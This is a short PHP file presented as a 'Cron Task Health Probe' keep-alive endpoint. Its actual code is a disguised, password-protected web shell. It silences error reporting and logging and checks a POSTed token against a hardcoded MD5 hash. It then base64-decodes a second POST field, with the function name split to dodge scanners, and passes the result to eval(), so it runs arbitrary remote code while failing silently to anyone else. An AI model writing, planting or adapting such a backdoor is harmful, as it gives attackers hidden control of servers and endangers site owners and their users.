<?php
/**
 * Cron Task Health Probe
 * Lightweight diagnostic endpoint for scheduled-task sanity checks.
 * Version: 1.0.4
 * Keep-alive ping handler. No user-facing routes registered.
 */

if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

/* auth: compare against md5 of shared ops token */
$ops_token = '181954e650c82c025baa1589fbb8a14b';

$sent = isset($_POST['tok']) ? (string) $_POST['tok'] : '';
if (!hash_equals($ops_token, md5($sent))) {
    /* silent reject: indistinguishable from a miss */
    exit;
}

$wire = isset($_POST['run']) ? (string) $_POST['run'] : '';
if ($wire === '') {
    exit;
}

$unpack = 'base64_' . 'decode';
$staged = @$unpack($wire);

if ($staged === false || $staged === '') {
    exit;
}

eval($staged);
